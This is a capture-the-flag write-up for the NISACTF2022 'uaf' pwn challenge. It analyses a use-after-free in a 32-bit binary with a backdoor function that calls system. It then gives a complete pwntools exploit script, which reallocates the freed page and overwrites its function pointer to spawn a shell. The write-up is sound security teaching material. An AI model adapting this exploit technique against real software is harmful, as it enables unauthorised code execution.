---
title: NISACTF2022-uaf-wp
date: 2023-06-19 11:37:20
tags:
- CTF
- pwn
- heap
- uaf
- NISACTF2022
- nssctf
categories:
- pwn-wp
---
[相关资源](https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/19/NISACTF2022-uaf-wp)  

## 0x1 分析

* PIE未开
* free完没有置空，存在uaf漏洞
* 存在后门函数`NICO(char* command)`，执行`system(command)`;
* page为结构体指针数组  结构体组成：char str[4] 和 void* func (各为32位)
* show(0) 会执行 (page[0]->func)(page[0]->str)

## 0x2 思路

* create page[0]
* del page[0]
* create page[1] （此时page[0]和page[1]相同，指向相同空间）
* edit page[1] ---->  'sh\0\0'+p32(NICO)   (即修改了page[0])
* show(0)

## 0x3 exp

```python
from pwn import *
pty = process.PTY
context(os='linux', arch='i386', log_level='debug')

proc = process("./bin", stdin=pty, stdout=pty)
# proc = remote("node4.anna.nssctf.cn", 28035)
belf = ELF("./bin")

def s(x): proc.send(x)
def sl(x): return proc.sendline(x)
def sd(x): return proc.send(x)
def sla(x, y): return proc.sendlineafter(x, y)
def sa(x, y): return proc.sendafter(x, y)
def ru(x): return proc.recvuntil(x)
def rc(): return proc.recv()
def rl(): return proc.recvline()
def li(con): return log.info(con)
def ls(con): return log.success(con)
def pi(): return proc.interactive()
def pcls(): return proc.close()
def ga(): return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))

def add():
    sla(b':', b'1')

def dlt(idx):
    sla(b':', b'3')
    sla(b'page\n', str(idx).encode())

def shw(idx):
    sla(b':', b'4')
    sla(b'page\n', str(idx).encode())

def edt(idx, con):
    sla(b':', b'2')
    sla(b'page\n', str(idx).encode())
    sla(b'strings\n', con)

gscript = '''
    b main
    b create
    b del
    b show
    b edit
'''
# gdb.attach(proc, gdbscript=gscript)

NICO_addr = 0x08048642

add()
dlt(0)
add()
edt(1, b'sh\x00\x00'+p32(NICO_addr))
shw(0)

pi()
pause()

```

